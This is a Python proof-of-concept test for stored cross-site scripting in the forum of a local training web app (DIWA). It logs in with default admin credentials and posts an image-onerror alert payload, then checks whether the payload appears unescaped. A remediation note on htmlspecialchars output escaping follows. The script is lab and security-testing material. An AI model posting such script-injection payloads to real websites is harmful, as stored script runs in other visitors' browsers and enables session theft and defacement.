#!/usr/bin/env python3
"""
Stage 2 POC: Stored XSS in Forum Post
Target: http://127.0.0.1:8080 (local DIWA instance only - authorized testing)
Vulnerability: Post text stored without sanitization; displayed without htmlspecialchars()
"""

import requests
import sys
import uuid

TARGET = "http://127.0.0.1:8080"
SESSION = requests.Session()

def test_stored_xss_post():
    """
    Create a forum post with XSS payload, then retrieve it.
    Payload: <img src=x onerror="alert('XSS')">
    Expected: Payload reflected unescaped in post display page
    """
    print("[*] Testing Stored XSS in Forum Post...")
    
    try:
        # Login first
        login_payload = {
            'email': 'admin@example.com',
            'password': 'admin'
        }
        resp = SESSION.post(f"{TARGET}/?page=login", data=login_payload)
        
        # Find or create a thread to post in
        resp = SESSION.get(f"{TARGET}/?page=board")
        
        # Look for thread ID in response (e.g., thread&id=1)
        import re
        thread_match = re.search(r'id=(\d+)', resp.text)
        thread_id = thread_match.group(1) if thread_match else '1'
        
        # Create post with XSS payload
        unique_marker = str(uuid.uuid4())[:6]
        xss_payload = f'Test{unique_marker}<img src=x onerror="alert(\'XSS{unique_marker}\')">'
        
        post_payload = {
            'message': xss_payload
        }
        
        # Submit post (endpoint may vary)
        resp = SESSION.post(f"{TARGET}/?page=thread&id={thread_id}", data=post_payload)
        
        # Retrieve thread and check if XSS payload is present unescaped
        resp_thread = SESSION.get(f"{TARGET}/?page=thread&id={thread_id}")
        
        # Check for unescaped script tag or img tag with onerror
        if '<img src=x onerror=' in resp_thread.text or f'alert(\'{unique_marker}\')' in resp_thread.text:
            print("✅ VULNERABLE: Stored XSS payload reflected unescaped in post")
            return True
        
        # Also check for ANY unescaped HTML tags from our payload
        if unique_marker in resp_thread.text and '<img' in resp_thread.text:
            print("✅ VULNERABLE: HTML tags not escaped in post display")
            return True
        
        print("❌ NOT REPRODUCIBLE: Payload was escaped or filtered")
        return False
        
    except Exception as e:
        print(f"❌ NOT REPRODUCIBLE: Error - {e}")
        return False

if __name__ == '__main__':
    result = test_stored_xss_post()
    sys.exit(0 if result else 1)

"""
REMEDIATION:
Use htmlspecialchars() when outputting user-controlled data:

  // In template/display code:
  <?php
    echo '<div class="post-content">';
    echo htmlspecialchars($post['text'], ENT_QUOTES, 'UTF-8');
    echo '</div>';
  ?>

Key points:
- htmlspecialchars() converts < > & " ' to HTML entities (&lt;, &gt;, etc.)
- Use ENT_QUOTES to escape both double and single quotes
- Specify UTF-8 encoding
- Apply to ALL user-controlled output: $post['text'], $thread['title'], etc.
- Also sanitize on input (filter_var, strip_tags) for defense in depth
"""
